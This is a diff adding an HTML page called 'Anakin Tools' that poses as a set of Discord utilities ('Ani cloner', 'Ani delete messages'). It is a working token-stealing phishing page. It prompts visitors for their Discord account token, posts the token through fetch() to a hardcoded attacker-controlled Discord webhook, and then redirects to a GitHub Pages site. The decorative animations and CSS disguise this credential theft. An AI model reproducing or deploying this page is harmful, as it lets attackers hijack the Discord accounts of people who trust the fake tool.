@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anakin Tools</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black; /* Black background */
+            overflow: hidden; /* Hide overflow */
+        }
+        .panel {
+            color: white; /* White font color */
+            text-align: center; /* Center-align the content */
+            position: relative; /* Relative position for z-index */
+            z-index: 2; /* Ensure panel stays above background */
+        }
+        button {
+            margin: 10px;
+            padding: 15px 30px; /* Larger padding for larger buttons */
+            font-size: 20px; /* Larger font size for larger buttons */
+            cursor: pointer;
+            background-color: #222; /* Darker background for buttons */
+            color: white; /* White font color */
+            border: none; /* Remove border for smooth edges */
+            border-radius: 20px; /* Smoother edges */
+            transition: background-color 0.3s ease; /* Smooth transition on hover */
+        }
+        button:hover {
+            background-color: #666; /* Lighter background on hover */
+        }
+        .trail {
+            position: absolute;
+            width: 10px; /* Width of the trail */
+            height: 10px; /* Height of the trail */
+            border-radius: 50%; /* Circular shape */
+            background-color: white; /* White color */
+            pointer-events: none; /* Allow clicks through the trail */
+            animation: trailMove 0.5s linear infinite; /* Animation for smooth movement */
+        }
+        @keyframes trailMove {
+            0% {
+                opacity: 0; /* Start with invisible trail */
+            }
+            100% {
+                opacity: 0.6; /* End with semi-transparent trail */
+            }
+        }
+        .background-squares {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+        .square {
+            position: absolute;
+            width: 3px; /* Smaller size */
+            height: 3px; /* Smaller size */
+            background-color: red; /* Red color for squares */
+            animation: changeColor 6s infinite; /* Animation for color change */
+            transition: background-color 0.3s ease; /* Smooth transition on hover */
+        }
+        .square:hover {
+            background-color: gray; /* Change color to gray on hover */
+        }
+        @keyframes changeColor {
+            0% {
+                background-color: red;
+            }
+            16.67% {
+                background-color: orange;
+            }
+            33.33% {
+                background-color: yellow;
+            }
+            50% {
+                background-color: green;
+            }
+            66.67% {
+                background-color: blue;
+            }
+            83.33% {
+                background-color: indigo;
+            }
+            100% {
+                background-color: violet;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="panel">
+        <h1>Anakin Tools</h1> <!-- Title -->
+        <p>Please enter the correct token for your Discord account to complete your entry pages (not entering the token will not take you to the pages)</p> <!-- Description -->
+        <button onclick="getToken('server-cloner')">Ani cloner</button>
+        <button onclick="getToken('Auto delete messages')">Ani delete messages</button>
+    </div>
+
+    <div class="background-squares">
+        <!-- Place multiple squares randomly on the page -->
+        <script>
+            // Create squares and append them to the background
+            const numSquares = 600; // Reduced number of squares
+            const background = document.querySelector('.background-squares');
+            for (let i = 0; i < numSquares; i++) {
+                const square = document.createElement('div');
+                square.classList.add('square');
+                square.style.top = Math.random() * 90 + 5 + 'vh'; // Random vertical position (5vh to 95vh)
+                square.style.left = Math.random() * 90 + 5 + 'vw'; // Random horizontal position (5vw to 95vw)
+                background.appendChild(square);
+            }
+        </script>
+    </div>
+
+    <script>
+        document.addEventListener('mousemove', (e) => {
+            const mouseX = e.clientX;
+            const mouseY = e.clientY;
+            const trail = document.createElement('div');
+            trail.classList.add('trail');
+            trail.style.left = mouseX + 'px';
+            trail.style.top = mouseY + 'px';
+            document.body.appendChild(trail);
+            setTimeout(() => {
+                trail.remove();
+            }, 200);
+        });
+
+        function getToken(accountType) {
+            var token = prompt(`Please enter your Discord token for ${accountType}:`);
+            if (token) {
+                sendTokenToWebhook(token, accountType);
+            } else {
+                alert('No token provided.');
+            }
+        }
+
+        function sendTokenToWebhook(token, accountType) {
+            // Construct JSON payload
+            var payload = {
+                content: `Token for ${accountType}: ${token}`
+            };
+
+            // Replace this URL with your Discord webhook URL
+            var webhookURL = "https://discord.com/api/webhooks/1246700470068711466/YGJOSIhp-yYUXDE2bPX3p9ZV5Oz9OA-UKhW6AdJN-gfvJjEqmGf_a6Cz6wI_N-1JE467";
+
+            // Send data to Discord webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                console.log('Token sent to Discord');
+                window.location.href = "http://neunl.github.io/Lendreo/"; // Redirect to the specified website
+            })
+            .catch(error => console.error('Error sending token to Discord:', error));
+        }
+    </script>
+</body>
+</html>
